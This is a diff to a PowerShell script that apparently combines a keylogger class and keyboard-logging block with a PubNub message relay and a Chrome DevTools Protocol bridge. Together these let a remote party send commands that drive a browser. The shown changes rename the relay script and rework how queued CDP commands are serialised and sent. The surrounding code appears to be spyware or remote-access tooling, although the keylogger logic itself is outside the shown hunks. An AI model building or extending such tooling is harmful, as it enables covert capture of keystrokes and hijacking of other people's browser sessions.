@@ -97,7 +97,7 @@ public class KeyLogger
 ' -ReferencedAssemblies System.Windows.Forms
 
 function Get-Identity {
-    $ScriptName = "pscdp.relay.ps1"
+    $ScriptName = "pscdp.relay.bridge.ps1"
 
     $ComputerName = $env:COMPUTERNAME
     
@@ -342,7 +342,7 @@ function Publish-PBMessage {
 
     $pbmsg = @{
         builtincmd="ProcessCDPBridge"
-        source="pscdp.relay.ps1"
+        source="pscdp.relay.bridge.ps1"
         destination="nodecdpproxy.js"
         ts=$(Get-Timestamp)
         resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
@@ -395,9 +395,9 @@ function Process-PubNubEvent {
 
     $payload = $Message
 
-    if ( $payload.source -eq "pscdp.relay.ps1" ) {
+    if ( $payload.source -eq "pscdp.relay.bridge.ps1" ) {
         return
-    } elseif ( ! ( $payload.destination -eq "pscdp.relay.ps1" ) ) {
+    } elseif ( ! ( $payload.destination -eq "pscdp.relay.bridge.ps1" ) ) {
         return
     } elseif ( [string]::IsNullOrEmpty($payload.builtincmd) ) {
         return
@@ -538,10 +538,12 @@ class PSCDPBridge {
                 # callback=$script:getTargets_callback
             }
         )
+        
     }
 
-    [void] SendCdpCommand($payload) {
-           
+    [void] SendCdpCommand($cmd) {
+
+        $payload = $cmd | ConvertTo-Json -Compress -Depth 10
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
         $buffer = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
         
@@ -640,7 +642,7 @@ class PSCDPBridge {
     [void] NextCmd() {
 
         if ( $null -eq $this.sendQueue ) {
-            $this.sendQueue = [System.Collections.Generic.List[PSCDPCommand]]::new()
+            $this.sendQueue = [System.Collections.Generic.List[hashtable]]::new()
         }
 
         if ( $this.sendQueue.Count -le 0 ) {
@@ -654,25 +656,9 @@ class PSCDPBridge {
             throw [PSCDPException]::new('cmd is null')
         }
 
-        $targetid = $cmd.targetid
-        $target = $cmd.target
-
-        if ( $null -eq $target -and ( ! [string]::IsNullOrEmpty($targetid) ) ) {
-            $target = $this.GetTarget($targetid)
-        }
-
-        if ( $null -ne $target -and ( [string]::IsNullOrEmpty($targetid) ) ) {
-            $targetid = $target.targetId
-        }
-
-        $cmd.target = $target
-        $cmd.targetid = $targetid
-
-        if ( $null -ne $target ) {
-            $target.commands.Add($cmd)
-        }
-
-        $cmd = $this.SendCdpCommand($cmd)
+        $cmd['id'] = $this.messageId++
+        
+        $this.SendCdpCommand($cmd)
     }
 
     [void] LogState() {
@@ -1002,7 +988,7 @@ $keyboardlogger = {
 # $asyncResult = $ps.BeginInvoke()
 
 if ( [string]::IsNullOrWhiteSpace($script:scriptfname) ) {
-    $scriptfname = "pscdp.relay.ps1"
+    $scriptfname = "pscdp.relay.bridge.ps1"
 }
 
 $script:pb = [PubNub]::new()
